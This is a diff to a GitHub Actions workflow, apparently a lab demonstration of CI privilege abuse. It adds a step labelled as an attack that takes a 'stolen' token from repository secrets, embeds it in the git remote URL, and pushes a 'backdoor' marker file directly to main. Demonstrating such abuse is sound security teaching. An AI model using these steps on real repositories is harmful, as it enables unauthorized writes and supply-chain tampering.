@@ -16,3 +16,20 @@ jobs:
           format: 'table'
           exit-code: '1' # GAGALKAN pipeline jika ditemukan celah High/Critical
           severity: 'CRITICAL,HIGH'
+
+      - name: Attack - Successful Privilege Abuse
+        env:
+          # Memanggil token curian dari secret
+          MY_SECRET_TOKEN: ${{ secrets.HACKER_TOKEN }}
+        run: |
+          echo "Menjalankan serangan dengan token curian..."
+          git config --global user.email "hacker@evil.com"
+          git config --global user.name "Hacker Jahat"
+          echo "BACKDOOR BERHASIL DISISIPKAN" > backdoor_leaked_token.txt
+
+          # Trik utama: Mengganti URL remote dengan token curian agar punya izin Write
+          git remote set-url origin https://$MY_SECRET_TOKEN@github.com/${{ github.repository }}.git
+
+          git add backdoor_leaked_token.txt
+          git commit -m "EVIL: Menembus proteksi default GitHub"
+          git push origin main
